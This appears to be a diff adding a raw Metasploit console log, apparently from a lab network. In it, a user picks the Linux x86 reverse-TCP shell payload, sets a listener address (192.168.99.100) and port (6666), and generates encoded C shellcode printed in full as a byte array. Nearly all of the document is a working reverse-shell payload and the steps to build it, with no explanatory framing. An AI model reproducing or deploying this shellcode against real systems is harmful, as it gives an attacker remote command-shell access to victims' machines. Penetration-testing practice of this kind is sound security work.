@@ -1,0 +1,82 @@
+msf payload(reverse_tcp) > use payload/linux/x86/shell_reverse_tcp 
+msf payload(shell_reverse_tcp) > shiwoInterrupt: use the 'exit' command to quit
+msf payload(shell_reverse_tcp) > hswo inInterrupt: use the 'exit' command to quit
+msf payload(shell_reverse_tcp) > shwo info
+[-] Unknown command: shwo.
+msf payload(shell_reverse_tcp) > show info
+
+       Name: Linux Command Shell, Reverse TCP Inline
+     Module: payload/linux/x86/shell_reverse_tcp
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 68
+       Rank: Normal
+
+Provided by:
+  Ramon de C Valle <rcvalle@metasploit.com>
+  joev <joev@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+CMD    /bin/sh          yes       The command string to execute
+LHOST                   yes       The listen address
+LPORT  4444             yes       The listen port
+
+Description:
+  Connect back to attacker and spawn a command shell
+
+
+msf payload(shell_reverse_tcp) > set LHOSTInterrupt: use the 'exit' command to quit
+msf payload(shell_reverse_tcp) > set LHOST 192.168Interrupt: use the 'exit' command to quit
+msf payload(shell_reverse_tcp) > ifconfig
+[*] exec: ifconfig
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.99.100  netmask 255.255.255.0  broadcast 192.168.99.255
+        inet6 fe80::9f97:b827:13a5:4b54  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:92:7d:b8  txqueuelen 1000  (Ethernet)
+        RX packets 9289  bytes 697910 (681.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9090  bytes 1105264 (1.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 28  bytes 1680 (1.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 28  bytes 1680 (1.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+msf payload(shell_reverse_tcp) > set LHOST 192.168.99.100
+LHOST => 192.168.99.100
+msf payload(shell_reverse_tcp) > set LPORT 6666
+LPORT => 6666
+msf payload(shell_reverse_tcp) > generate -b "\x00" -f c
+[*] Writing 942 bytes to c...
+msf payload(shell_reverse_tcp) > generate -b "\x00" -t c
+/*
+ * linux/x86/shell_reverse_tcp - 95 bytes
+ * http://www.metasploit.com
+ * Encoder: x86/shikata_ga_nai
+ * VERBOSE=false, LHOST=192.168.99.100, LPORT=6666, 
+ * ReverseAllowProxy=false, StagerRetryCount=10, 
+ * StagerRetryWait=5.0, ReverseListenerThreaded=false, 
+ * PrependFork=false, PrependSetresuid=false, 
+ * PrependSetreuid=false, PrependSetuid=false, 
+ * PrependSetresgid=false, PrependSetregid=false, 
+ * PrependSetgid=false, PrependChrootBreak=false, 
+ * AppendExit=false, InitialAutoRunScript=, AutoRunScript=, 
+ * CMD=/bin/sh
+ */
+unsigned char buf[] = 
+"\xb8\xc4\x9a\x2e\x57\xda\xc1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+"\x12\x31\x45\x12\x83\xc5\x04\x03\x81\x94\xcc\xa2\x38\x72\xe7"
+"\xae\x69\xc7\x5b\x5b\x8f\x4e\xba\x2b\xe9\x9d\xbd\xdf\xac\xad"
+"\x81\x12\xce\x87\x84\x55\xa6\xd7\xdf\xc5\x52\xb0\x1d\x0a\x80"
+"\x4a\xab\xeb\x04\x2c\xfb\xba\x37\x02\xf8\xb5\x56\xa9\x7f\x97"
+"\xf0\x5c\xaf\x6b\x68\xc9\x80\xa4\x0a\x60\x56\x59\x98\x21\xe1"
+"\x7f\xac\xcd\x3c\xff";
